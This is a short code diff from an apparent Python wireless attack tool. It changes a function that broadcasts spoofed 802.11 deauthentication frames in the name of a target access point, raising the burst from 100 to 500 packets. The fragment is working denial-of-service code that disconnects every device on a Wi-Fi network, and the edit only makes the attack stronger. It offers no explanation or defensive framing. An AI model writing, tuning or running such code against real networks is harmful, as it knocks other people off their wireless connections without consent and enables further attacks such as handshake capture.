@@ -26,7 +26,7 @@ def get_wifi_networks(interface):
 def deauth_all_devices(target_bssid, iface):
     deauth_packet = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
 
-    sendp(deauth_packet, iface=iface, count=100, inter=0.1)
+    sendp(deauth_packet, iface=iface, count=500, inter=0.1)
 
 def run(args):
 
